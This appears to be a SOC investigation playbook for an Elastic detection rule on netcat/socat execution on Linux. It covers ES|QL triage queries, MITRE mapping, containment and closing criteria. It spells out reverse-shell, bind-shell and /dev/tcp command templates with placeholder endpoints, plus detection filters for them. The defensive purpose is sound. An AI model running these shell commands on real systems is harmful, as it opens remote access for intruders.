# Linux — Netcat/Socat Execution (Reverse Shell / Tunneling) — SOC Investigation Playbook

**Rule ID:** `nbi-lnx-reverse-shell-tools` · **Type:** query · **Language:** kuery (KQL) · **Severity:** High · **Confidence:** Medium · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-auditd.log-*` + `logs-auditd_manager.auditd-*` (auditd process events); `logs-system.auth-*` (SSH auth) · **Alert entities:** `$host`, `$user`, `$source_ip`, `$suspicious_pid`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry on 2026-08-17 with `$host = nim-pam-dbv07` (the busiest Linux host in the estate, a PAM/PostgreSQL container node), `$user = root` (the only broadly-populated `user.name` on that node — most auditd process docs carry a null `user.name`, so `user.id`/`user.effective.id` are the reliable actor fields), `$source_ip = 10.11.101.1` (a real SSH login source for that account from `logs-system.auth-*`), and `$suspicious_pid = 1790` (a real, currently-live parent PID on the host, used to prove the PID-lineage pivots execute). Every ES|QL block below returned successfully on the live NBI cluster; `nc`/`ncat`/`netcat`/`socat` have a genuine zero baseline here, so relay-keyed queries correctly return no rows while the actor/host/auth pivots return real data.

---

## 1. Purpose

This playbook drives triage and investigation of the **Linux — Netcat/Socat Execution (Reverse Shell / Tunneling)** detection on NBI's Elastic Security deployment. The rule fires when a Linux `execve` records a `process.name` of **`nc`, `ncat`, `netcat`, or `socat`**. These are general-purpose network relays that, with the right arguments, become **reverse shells** (connect out and hand a shell to a remote listener), **bind shells** (listen locally and hand a shell to whoever connects), or **tunnels/port-relays** for pivoting and exfiltration.

The rule matches the binary name; the role — reverse, bind, relay, or a benign one-off connectivity test — is entirely in the arguments. The analyst's job is to recover the command, endpoint, and shell attachment, attribute the launch context (who and from where), look for the wider reverse-shell arsenal, and classify the alert as **true_positive**, **false_positive** (authorised OR proven-failed), **misconfiguration**, or **needs_escalation** — with evidence attached.

## 2. Detection Summary

The deployed rule is a **KQL match** query over Linux auditd process telemetry, matching on the relay binary name only.

One-line Kibana KQL detection filter (for fast pivoting in Discover / Timeline):

```kql
event.category : "process" and process.name : ("nc" or "ncat" or "netcat" or "socat")
```

Plain English: **any** process execution on a Linux host where the image name is `nc`, `ncat`, `netcat`, or `socat`. These binaries have an effectively **zero baseline** across NBI's Linux fleet (no execution observed in the trailing 30 days), so any execution warrants reading the arguments. Every runnable investigation query below is ES|QL over the `_query` API, keyed on the alert entity and bounded to `@timestamp >= NOW() - 4 hours`.

## 3. Alert Meaning

An alert means: **on `$host`, one of `nc`/`ncat`/`netcat`/`socat` was executed.** The role is decided by the arguments:

- **`nc <host> <port> -e /bin/sh`** (or `-c`) connecting outbound and piping a shell is a **reverse shell** — live hands-on-keyboard command-and-control.
- **`nc -l -p <port> -e /bin/sh`** (or `-lvp`) is a **bind shell** — a listener handing a shell to whoever connects.
- **`socat TCP:<host>:<port> EXEC:/bin/bash`** (or the listener form) is a reverse or bind shell via socat's `EXEC`.
- **A plain `nc <internal-host> <port>`** with no shell may be a benign connectivity test.

The alert captures the *relay*; the investigation recovers the *endpoint and port* (for blocking and reputation), *whether a shell is attached* (`-e`/`EXEC`), *who launched it and from where* (a web/app service account from a temp/web path is a webshell hallmark; a sysadmin from a home directory is not), and *whether the broader reverse-shell arsenal appears alongside*. On a banking host, a reverse shell or tunnel is treated as an active intrusion until the endpoint and intent are disproven.

## 4. Typical Attacker Behavior

Netcat/socat relays are the fastest route to an interactive foothold (MITRE T1059.004 Unix Shell for the shell, T1572 Protocol Tunneling for the relay/tunnel, T1071.001 Web Protocols where an HTTP-looking channel is used):

1. **Drop a shell after initial access.** Following a webshell, an exploited service, or stolen credentials, the attacker runs `nc <c2> <port> -e /bin/sh` (or `bash -i >& /dev/tcp/<c2>/<port> 0>&1`, or a `socat ... EXEC` pair) to connect out and hand a shell to their listener — a reverse shell that bypasses inbound firewall rules.
2. **Or open a bind shell.** Where inbound is reachable, `nc -lvp <port> -e /bin/sh` listens locally and hands a shell to whoever connects.
3. **Or build a tunnel.** `socat`/`nc` stitch a port relay to pivot deeper into the network or to exfiltrate data over a covert channel that evades egress controls.
4. **Upgrade and operate.** Attackers frequently upgrade a raw relay to a full interactive TTY: `python -c 'import pty; pty.spawn("/bin/bash")'`, a `mkfifo` named-pipe backpipe, or `socat` with a PTY. The launch context is telling — a **web/app service account** spawning `nc` from a **web root, `/tmp`, or `/dev/shm`** is a webshell dropping a reverse shell; the same account also spawning interpreters and recon tools reinforces it.

The relay is not required for C2 — a `bash /dev/tcp` shell, a Python/Perl/PHP one-liner, `ssh -R`, or an HTTPS beacon all provide reverse access without `nc`/`socat` (see §23). When the relay *is* used, capture the destination address and port from the arguments for blocking and reputation.

## 5. Common False Positives

- **Authorised connectivity checks.** An administrator or monitoring job using `nc` to test whether an internal port is open (no shell attachment, internal endpoint).
- **Authorised data transfers.** A one-off `nc`/`socat` move of data between internal hosts by a known identity.
- **Recognised automation** (a health-check script) using `nc` for a port probe on a stable internal endpoint.
- **Administrator / red-team / purple-team exercises** deliberately exercising a reverse/bind shell. Authorised malicious-technique execution — confirm against a change ticket or exercise ROE before classifying as false_positive (blocked/authorised), never dismiss on sight.

Because these relays are unused in NBI's baseline, even a "legitimate" invocation is rare enough to warrant confirming the identity, endpoint, and absence of a shell attachment against a change record rather than assuming benign.

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live `logs-auditd.log-*` / `logs-auditd_manager.auditd-*` on 2026-08-17:

- **True zero baseline.** `nc`/`ncat`/`netcat`/`socat` executed 0 times across the fleet in the trailing 30 days and 0 in the live 4-hour window on the busiest node, against a healthy ~141k process events per 4h fleet-wide. There is no noisy legitimate relay to tune out; any execution stands alone.
- **The actor is almost always `root`, and `user.name` is frequently null.** On the busiest Linux hosts (the PAM/PostgreSQL container nodes and the devops Kubernetes masters/workers), process activity runs overwhelmingly as `root` (`user.id == 0`) with a null `user.name`. Corroborate the actor with `user.id`; the webshell hallmark to watch for is a **non-root web/app service account** spawning the relay from a web/temp path.
- **The C2 endpoint is not a structured field.** These process events do not reliably carry the remote destination — the endpoint is read from the arguments (`argline`), not from `destination.ip`. A truncated argument list can hide it; recover it from the host's auditd `SOCKADDR`/`EXECVE` records if needed.
- **No historical NBI benign-true-positive is on record for this rule.** No environment-specific allow-list applies. Do not create a blanket exception off a single alert; scope any exception to an exact account + endpoint + purpose + change reference.

## 7. Investigation Prerequisites

- Access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API, read-only; and, to recover the endpoint when arguments are truncated, host-side access to the auditd `SOCKADDR`/`EXECVE` records via the Linux platform team.
- The alert's entity values: `host.name` (`$host`), the launching `user.name`/`user.id` (`$user`), the SSH `source.ip` (`$source_ip`) of the launching session via `logs-system.auth-*`, and the relay's `process.pid` (`$suspicious_pid`) for PID-based lineage.
- Awareness of NBI's Linux telemetry reality (§8): **auditd process events only; the C2 endpoint is in the arguments, not `destination.ip`; `process.parent.executable`/`.name` not populated (lineage by `process.parent.pid`); `process.command_line` absent (reconstruct from multivalued `process.args`); `user.name` frequently null (use `user.id`).**
- The current UTC time and a tight incident window (every query keeps `@timestamp >= NOW() - 4 hours`).

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-auditd.log-*`** and **`logs-auditd_manager.auditd-*`** — Linux auditd process telemetry (both live and current; ~141k process events per 4h fleet-wide). Anchors the relay execution, the launch context, and the reverse-shell arsenal.
- **`logs-system.auth-*`** — Linux authentication (SSH/PAM). Live; carries `source.ip`, `user.name`, `event.action`, `process.name`. Used for the IP, authentication, and lateral-movement pivots.

**Field population (measured live on NBI, 2026-08-17):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% | The relay image and path. |
| `process.args` (multivalued) | broadly populated | `MV_CONCAT(process.args, " ")` reconstructs the endpoint/port and any `-e`/`EXEC` shell attachment. |
| `process.working_directory` | partial | A web root, `/tmp`, or `/dev/shm` strengthens the malicious reading. |
| `process.pid`, `process.parent.pid` | ~100% | PID-based lineage (no entity-id sequence join). |
| `user.id`, `user.effective.id` | ~100% | Reliable actor identity; a non-root service account launching a relay is the webshell hallmark. |
| `user.name` | sparse | Often null; corroborate with `user.id`. |
| `source.ip` (auth index) | populated on SSH logins | In `logs-system.auth-*`, not the process index. |

**Telemetry-blocked / not collected on NBI (mark `N/A` in §15):**

- **No structured C2 destination** — the remote endpoint is in `process.args`, not `destination.ip`; there is no reliable network-tuple field on these events.
- **`process.parent.executable` / `process.parent.name` are not populated** — only `process.parent.pid`; parent attribution is by PID.
- **No process hashes, DNS, URL, or email telemetry** tied to this host-based process event.

Empty result ≠ safe: the relays have a zero baseline, so an empty confirm query is normal and never, by itself, evidence of safety.

## 9. MITRE ATT&CK Mapping

From the rule's `threat[]`:

- **Tactic: Command and Control (TA0011)** — https://attack.mitre.org/tactics/TA0011/
- **Technique: T1059.004 — Command and Scripting Interpreter: Unix Shell** — https://attack.mitre.org/techniques/T1059/004/
- **Technique: T1572 — Protocol Tunneling** — https://attack.mitre.org/techniques/T1572/
- **Technique: T1071.001 — Application Layer Protocol: Web Protocols** — https://attack.mitre.org/techniques/T1071/001/

The behaviour is command-and-control: a shell handed over a network relay (T1059.004), a tunnel/port-relay for pivoting or exfiltration (T1572), and, where an HTTP-looking channel is used, web-protocol C2 (T1071.001).

## 10. Severity Guidance

Deployed severity is **High** with **Medium** confidence. Adjust the *effective* incident priority using NBI-specific context:

- **Raise toward Critical** when: `argline` shows a **shell attached** (`-e`/`EXEC`) to an **external endpoint** (or a bind listener); the launcher is a **service/web account** from a **temp/web path** (§15.4a); the **wider reverse-shell arsenal** co-occurs (`/dev/tcp`, `pty.spawn`, `mkfifo`, `EXEC` — §17.5); or lateral movement follows.
- **Keep at High** for a relay execution pending recovery of the endpoint and shell-attachment detail.
- **Lower only** to **false_positive** when a change record positively matches an authorised connectivity check/transfer (internal endpoint, no shell attachment), or the attempt is positively proven to have failed to connect — documented, not assumed.

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, the launching `user.id`/`user.name`, the relay (`nc`/`ncat`/`netcat`/`socat`), and the timestamp.
2. **Recover the command, endpoint, and shell attachment** with §14.2 — read `argline` for the remote host/port and any `-e`/`-c`/`EXEC`/`-l`/`-lvp`. Capture the destination for blocking and reputation.
3. **Attribute the launch** with §15.4a — is the launcher a **service/web account** from a **web root, `/tmp`, or `/dev/shm`** (webshell hallmark), or a sysadmin from an admin path?
4. **Check for the reverse-shell arsenal** with §17.5 — co-occurring `/dev/tcp`, `pty.spawn`, `mkfifo`, or `EXEC` confirms an interactive reverse shell.
5. **Check for a benign explanation** (§5/§6): change record, internal endpoint, no shell attachment. If none exists, do not dismiss.
6. **Decide:** shell attached to an external endpoint (or bind listener) by a service/web account, and/or the arsenal present, with no authorised task → escalate to Tier 2 as **true_positive** candidate, isolate `$host`, block the endpoint; positively matched authorised task → **false_positive**; missing endpoint/context → **needs_escalation**. Never close as benign without proof.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Recover the endpoint and role** (§14.2, §15.1): the remote host/port and whether a shell is attached (reverse/bind) or it is a listener/relay.
2. **Attribute the launch** (§15.4a): the account and working directory — service/web + temp/web path vs sysadmin + admin path.
3. **Confirm the C2 nature** (§17.5): the wider reverse-shell arsenal (`/dev/tcp`, `pty.spawn`, `mkfifo`, `EXEC`) alongside the relay.
4. **Bound the session** (§15.6, §15.12, §16) and reconstruct the process tree (§15.3).
5. **Validate the wider chain** (§17): lateral movement / pivoting (§17.1), persistence (§17.2), privilege context (§17.3), and defense evasion (§17.4).
6. **Escalate to Tier 3 / IR** if an interactive shell or tunnel to an external endpoint is confirmed — block the endpoint at egress and isolate the host (see §21).

## 13. Decision Tree

```
Alert: nc/ncat/netcat/socat executed on $host (§14 confirms the execve)
│
├─ Anchor not reproducible / tool name mismatch
│     → re-open in Discover; if truly absent → needs_escalation (data-quality)
│
├─ Anchor confirmed → recover endpoint/shell (§14.2/§15.1) and launcher (§15.4a)
│   │
│   ├─ Authorised connectivity/transfer positively matched (known identity, internal
│   │   endpoint, no -e/EXEC, change record)
│   │     → false_positive (authorised) — document the reference
│   │
│   ├─ Reverse/bind attempt positively proven to have failed to connect
│   │     → false_positive (proven-failed C2 attempt) — never "benign"
│   │
│   ├─ Legitimate script/monitoring job using nc/socat (port health-check), no shell
│   │   attachment, no external endpoint, simply not yet baselined
│   │     → misconfiguration — document and baseline
│   │
│   └─ Shell attached to an external endpoint (or bind listener) AND/OR the reverse-shell
│       arsenal (§17.5), launched by a service/web account from a temp/web path (§15.4a),
│       not an authorised task
│         → true_positive — reverse/bind shell or tunnel; Containment (§18); escalate §21
│
└─ Endpoint/arguments missing, or launcher and intent unestablished
      → needs_escalation — hand to Tier 3/IR (on-host SOCKADDR/EXECVE) with the gaps noted
```

## 14. Validation Queries

### 14.1 Reproduce the rule estate-wide (confirm the detection logic)

Faithful ES|QL translation of the deployed KQL. In NBI this is normally 0 (the zero baseline); a non-zero result is immediately notable.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND process.name IN ("nc","ncat","netcat","socat")
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, host.name, user.name, user.id, process.name, process.executable, argline
| SORT @timestamp DESC
| LIMIT 100
```

### 14.2 Confirm on the alert host — recover command, endpoint and shell attachment

Scopes to `$host` to see the remote endpoint and port and whether a shell is attached. Reused verbatim from the deployed playbook (`LNXNCAT-INV-01`).

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE event.category=="process" AND host.name=="$host"
    AND process.name IN ("nc","ncat","netcat","socat")
    AND @timestamp >= NOW() - 4 hours
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, host.name, user.name, user.id, process.name, process.executable, argline, process.working_directory
| SORT @timestamp DESC
| LIMIT 50
```

Read `argline` for the role: `nc` with `-e /bin/sh` (or `-c`) pointing at a remote host and port is a reverse shell; `nc -l` or `-lvp` is a listener/bind shell; `socat` with `EXEC:/bin/bash` paired with a TCP endpoint is a reverse or bind shell; a plain `nc` to an internal host and port with no shell may be a connectivity test. Capture the destination address and port for blocking and reputation. A working directory under `/tmp`, `/dev/shm`, or a web root strengthens the malicious reading.

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity set: retrieve the relay executions on `$host` with lineage fields added, confirming every downstream `$var` (relay, endpoint, working directory, pid, parent pid, user.id) from real data.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("nc","ncat","netcat","socat")
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, host.name, user.id, user.effective.id, process.name, process.executable, argline, process.pid, process.parent.pid, process.working_directory
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Estate prevalence of the relay image.** A tool that never runs anywhere is maximally anomalous. Scoped to exact names over 4h (safe).

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND process.name IN ("nc","ncat","netcat","socat")
| STATS execs = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.id) BY process.name, process.executable
| SORT execs DESC
| LIMIT 25
```

**15.2b — Command-line detail for the relay on the host.** Surfaces the full arguments (endpoint, shell attachment) via `MV_CONCAT`; honestly returns nothing where `process.args` is null.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("nc","ncat","netcat","socat")
    AND process.args IS NOT NULL
| EVAL arguments = MV_CONCAT(process.args, " ")
| KEEP @timestamp, host.name, user.id, process.executable, arguments, process.working_directory
| SORT @timestamp DESC
| LIMIT 50
```

### 15.3 Parent-Child process analysis

NBI's auditd telemetry does **not** populate `process.parent.executable`/`.name` — only `process.parent.pid`. Lineage is reconstructed by PID; this is how a relay is tied back to a webshell's interpreter parent.

**15.3a — Group the actor's activity by parent PID.** Ties the relay to the shell/interpreter (or service) lineage that launched it — a web/app interpreter parent is a webshell hallmark.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND user.name == "$user"
| STATS execs = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.parent.pid
| SORT execs DESC
| LIMIT 40
```

**15.3b — Walk the descendants of the suspect PID.** Join `process.parent.pid` to the relay's `process.pid` (`$suspicious_pid`) to see what a bind/reverse shell then spawned. Corroborate with timing (PIDs are reused).

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.parent.pid == $suspicious_pid
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, user.id, process.parent.pid, process.name, process.pid, process.executable, argline, process.working_directory
| SORT @timestamp ASC
| LIMIT 100
```

### 15.4 User investigation

**15.4a — Attribute the launch context (who and from where)** (reused verbatim from the deployed playbook, `LNXNCAT-INV-02`). A web/app service identity spawning `nc` from a web root, `/tmp`, or `/dev/shm` is consistent with a webshell dropping a reverse shell; a human sysadmin identity from a home/admin path running a one-off test is a very different, benign-leaning picture.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE event.category=="process" AND host.name=="$host" AND user.name=="$user"
    AND @timestamp >= NOW() - 4 hours
| STATS execs=COUNT(*) BY process.name, process.working_directory, user.id
| SORT execs DESC
| LIMIT 25
```

**15.4b — The account's footprint across hosts.** An account suddenly spanning multiple hosts around the relay is spreading.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND user.name == "$user"
| STATS execs = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT execs DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline `$host` by surfacing its **rarest** process names first — one-off relays and out-of-place binaries stand out against routine daemon churn.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
| STATS execs = COUNT(*), users = COUNT_DISTINCT(user.id) BY process.name
| SORT execs ASC
| LIMIT 40
```

### 15.6 IP investigation

The **C2 endpoint** is in the relay arguments (§14.2), not a structured field — read it from `argline`. What the process index *can* provide is the **SSH source** of the launching session, from `logs-system.auth-*` — the operator's origin if the relay was launched from an interactive session (a webshell-launched relay will have no matching interactive login, which is itself informative).

```esql
FROM logs-system.auth-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, event.action
| SORT logons DESC
| LIMIT 20
```

### 15.7 Domain investigation

N/A — no DNS/network-domain telemetry is collected for NBI Linux hosts on these indices. If the relay connects to a hostname rather than an IP, that resolution is not in auditd. Alternative: pivot on the host IP and the endpoint from `argline` in `logs-fortinet_fortigate.log-*` out of band, or recover DNS-cache/connection state from the host during response.

### 15.8 URL investigation

N/A — no URL/web-proxy telemetry is associated with this host-based process event. If the channel is HTTP-looking (T1071.001), the URL is not in auditd. Alternative: correlate against perimeter web/proxy logs (`logs-fortinet_fortigate.log-*`, or FortiWeb under `logs-tcp.generic-*`) by the host IP and the endpoint from `argline`.

### 15.9 Hash investigation

N/A — process hashes are not collected. `process.hash.*` is not present on NBI auditd process events. Alternative: obtain the SHA-256 of `process.executable` (and of any dropped payload) directly from `$host` (`sha256sum`) during response and check reputation out of band; check the endpoint IP/port reputation separately.

### 15.10 File investigation

The file artifacts of interest are the relay's image path and its working directory (a web root, `/tmp`, or `/dev/shm` is a strong signal). Enumerate them for the relay on `$host`.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("nc","ncat","netcat","socat")
| STATS execs = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.executable, process.working_directory
| SORT execs DESC
| LIMIT 30
```

### 15.11 Email investigation

N/A — no email/message telemetry is in scope for this host-based command-and-control alert on NBI. Alternative: if initial access via phishing is suspected upstream of the webshell/exploit, pivot in the mail-security stack out of band using the incident timeframe.

### 15.12 Authentication investigation

Reconstruct `$user`'s SSH session activity on `$host` to distinguish an interactive operator (an SSH login precedes the relay) from a **webshell-launched relay** (a service account spawns the relay with no matching interactive login) — a strong indicator of the launch context.

```esql
FROM logs-system.auth-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.action, source.ip, process.name
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process stream for `$user` on `$host` so the sequence (interpreter/webshell parent → relay → any spawned shell) is explicit. `process.pid`/`process.parent.pid` are ~100% populated, so the chain is legible; `argline` carries the endpoint where `process.args` is populated.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND user.name == "$user"
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, process.parent.pid, process.pid, process.name, process.executable, argline, user.id
| SORT @timestamp ASC
| LIMIT 200
```

Anchor the read on the alert timestamp and read outward; cross-reference the SSH session bounds from §15.12 — a relay with no surrounding interactive login points to a service/webshell launch.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` (or the same `$source_ip`) authenticate to hosts **other than** `$host` in the window? A relay used as a pivot precedes logins to internal peers. Uses the auth index; correlate also with the endpoint from `argline` for outbound pivoting.

```esql
FROM logs-system.auth-*
| WHERE @timestamp >= NOW() - 4 hours
    AND (user.name == "$user" OR source.ip == "$source_ip")
    AND host.name != "$host"
    AND source.ip IS NOT NULL
| STATS events = COUNT(*) BY host.name, source.ip, user.name, event.action
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Look for persistence primitives on `$host` in the window — an attacker with an interactive shell frequently installs a scheduled/relaunch mechanism so the C2 survives a dropped session.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("crontab","at","batch","systemctl","systemd-run","cron","crond","update-rc.d")
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, process.name, argline, user.id, user.effective.id
| SORT @timestamp DESC
| LIMIT 30
```

### 17.3 Privilege escalation validation

Enumerate privilege-changing tools on `$host` to see whether the shell was used to escalate. A web/app service account launching the relay and then escalating to root is a full compromise chain; on the busy nodes root activity is already the norm (the finding is a compromised root context).

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("sudo","su","pkexec","doas","setuid")
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, user.name, user.id, user.effective.id, process.name, argline
| SORT @timestamp DESC
| LIMIT 30
```

### 17.4 Defense evasion validation

Check whether the actor cleared tracks around the relay — log/audit/history tampering that would hide the C2 session.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.category == "process"
    AND host.name == "$host"
    AND process.name IN ("shred","truncate","auditctl","journalctl","rm","unlink","chattr")
| EVAL argline = MV_CONCAT(process.args, " ")
| KEEP @timestamp, process.name, argline, user.id
| SORT @timestamp DESC
| LIMIT 30
```

### 17.5 Impact assessment

**Confirm the interactive-shell nature** (reused verbatim from the deployed playbook, `LNXNCAT-INV-03`). A cluster containing an interactive `bash` to `/dev/tcp`, a Python `pty.spawn` shell upgrade, a `mkfifo` named-pipe backpipe, or `socat EXEC` alongside the relay is a confirmed interactive reverse shell rather than a one-off connectivity test. The `LIKE` filters run over the concatenated argument string, so they read the full command line.

```esql
FROM logs-auditd.log-*,logs-auditd_manager.auditd-*
| WHERE event.category=="process" AND host.name=="$host"
    AND process.name IN ("nc","ncat","netcat","socat","mkfifo","telnet","openssl","python","python3","perl","bash","sh")
    AND @timestamp >= NOW() - 4 hours
| EVAL argline = MV_CONCAT(process.args, " ")
| WHERE argline LIKE "*/dev/tcp*" OR argline LIKE "*EXEC*" OR argline LIKE "* -e *" OR argline LIKE "*pty.spawn*" OR argline LIKE "*mkfifo*" OR process.name IN ("nc","ncat","netcat","socat")
| KEEP @timestamp, process.name, argline, user.name, user.id
| SORT @timestamp DESC
| LIMIT 40
```

## 18. Containment

- **Kill the session and its parent.** Terminate the relay (`$suspicious_pid`) and its parent interpreter/webshell process tree (§15.3) to drop the C2 channel.
- **Block the C2 endpoint at egress.** Read the destination address and port from `argline` (§14.2) and block it at the FortiGate/egress; add it to watchlists.
- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed. On a shared container node, coordinate with the platform team to protect co-located workloads while prioritising containment.
- **Preserve the process tree** and, via the platform team, the host's auditd `SOCKADDR`/`EXECVE` records for the endpoint, before further change.
- Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the webshell / initial-access artifact** that launched the relay (identify it via the parent lineage §15.3 and the working directory §15.10) and any dropped tooling.
- **Remove any persistence** installed from the shell (§17.2) so the C2 cannot relaunch.
- **Keep the endpoint blocked** and hunt for the same endpoint and relay pattern across peers, especially any host `$user`/`$source_ip` touched (§15.4b, §17.1).
- **Remediate the initial-access vector** (exploited service, webshell upload path) that gave the attacker execution.

## 20. Recovery

- **Rotate credentials and keys** exposed on `$host` during the C2 window — the service/app account, service credentials, and any SSH keys; if this is a PAM/DB node, treat vaulted/DB secrets as potentially exposed and rotate on priority.
- **Restore `$host`** from a known-good image if the attacker had extensive hands-on access; otherwise validate that webshell/persistence removal holds after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms no new relay or call-back recurs.
- **Harden** (§23): tighten egress filtering and default-deny outbound from server segments, remove or restrict `nc`/`socat` on production hosts, and monitor service accounts spawning interpreters or relays from web/temp paths.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- A **shell is attached** (`-e`/`EXEC`) to an **external endpoint**, or a **bind listener** is confirmed (§14.2).
- The **reverse-shell arsenal** co-occurs (`/dev/tcp`, `pty.spawn`, `mkfifo`, `EXEC` — §17.5), confirming an interactive session.
- The launcher is a **service/web account** from a temp/web path (§15.4a) — a webshell-driven C2.
- **Lateral movement / pivoting** follows (§17.1), or persistence was installed from the shell (§17.2).
- Endpoint/arguments cannot be recovered and intent cannot be established — escalate as **needs_escalation** (on-host `SOCKADDR`/`EXECVE`) with the gaps named.

## 22. Closing Criteria

- **false_positive (authorised):** a change record positively matches an authorised connectivity check/transfer (known identity, internal endpoint, no `-e`/`EXEC`). Record the reference. Do not create a broad exception; if warranted, scope it to the exact account + endpoint.
- **false_positive (proven-failed C2 attempt):** a reverse/bind attempt positively proven to have failed to connect / been blocked at egress — documented as a blocked attempt, never "benign".
- **misconfiguration:** a legitimate script/monitoring job used `nc`/`socat` with no shell attachment and no external endpoint, simply not yet baselined; document and baseline it (prefer a purpose-built check).
- **true_positive:** reverse/bind shell or tunnel confirmed; session killed, endpoint blocked, `$host` contained, webshell/persistence removed, exposed credentials rotated, scope of `$user`/`$source_ip`/peers established, initial access hunted, no recurrence on monitoring.
- **needs_escalation:** handed to Tier 3/IR with the specific evidence gaps documented.

In all cases: attach the ES|QL used and its results, the entity values, the remote endpoint/port, the launching account, whether a session was established, and any change reference before closing.

## 23. Analyst Notes

- **Zero baseline = high fidelity.** `nc`/`ncat`/`netcat`/`socat` do not appear in NBI's Linux process telemetry over 30 days or in the live 4-hour window. When this rule fires, read the arguments and treat it as active until disproven.
- **The endpoint hides in the arguments.** There is no `destination.ip` on these events — the C2 endpoint is in `argline` (`MV_CONCAT(process.args," ")`). A truncated argument list can hide it; recover it on-host from auditd `SOCKADDR`/`EXECVE`.
- **The launch context is the discriminator.** A **non-root service/web account** launching a relay from a **web/temp path** is the webshell hallmark and flips the verdict; a sysadmin from an admin path running a one-off test is benign-leaning. `user.name` is often null — use `user.id` and the parent lineage.
- **No SSH login behind the relay is itself a signal.** A relay launched by a service account with no matching interactive login (§15.12) points to a webshell/exploited-service launch rather than a hands-on admin.
- **No parent path → PID lineage.** With `process.parent.executable`/`.name` unpopulated, reconstruct trees with `process.parent.pid`/`process.pid` (§15.3), corroborating with timing.
- **The rule is name-based and evadable.** C2 does not require these binaries — a `bash -i >& /dev/tcp/<c2>/<port>` shell, a Python/Perl/PHP one-liner, `ssh -R`, or an HTTPS beacon all provide reverse access without `nc`/`socat`. Complementary signal: hunt interpreters spawning with `/dev/tcp` or `pty` patterns (the §17.5 arsenal), service accounts spawning shells, and outbound connections from server hosts to new external endpoints; correlate with egress/proxy and FortiGate flow data for the destination.
